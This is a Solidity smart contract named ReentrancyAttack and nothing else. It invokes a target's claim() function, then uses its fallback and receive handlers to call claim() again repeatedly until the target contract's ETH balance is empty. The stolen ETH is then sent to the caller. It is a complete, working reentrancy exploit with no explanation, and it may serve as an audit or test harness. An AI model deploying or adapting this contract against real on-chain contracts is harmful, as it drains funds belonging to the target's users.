// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;
 
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";

contract ReentrancyAttack {
    using SafeTransferLib for address;

    bool public callStatus;

    function getBytes() public pure returns (bytes memory) {
        return (abi.encodeWithSignature("claim()"));
    }

    function getContractBalance(address contractAddr) public view returns (uint256) {
        (,bytes memory returndata) = contractAddr.staticcall(abi.encodeWithSignature("contractEthBalance()"));

        return abi.decode(returndata, (uint256));
    }

    function claim(address contractAddr) external {
       (callStatus,) = contractAddr.call(getBytes());

       require(callStatus, "call failed");

       msg.sender.safeTransferETH(address(this).balance);       
    }

    function contractEthBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function _fallback() internal {
        uint256 amount =  getContractBalance(msg.sender);
        if(amount != 0) {
            (bool status,) = (msg.sender).call(getBytes());
            require(status, "fallback failed");
        }
    }

    fallback() external payable virtual {
        _fallback();
    }

    receive() external payable virtual {
        _fallback();
    }
}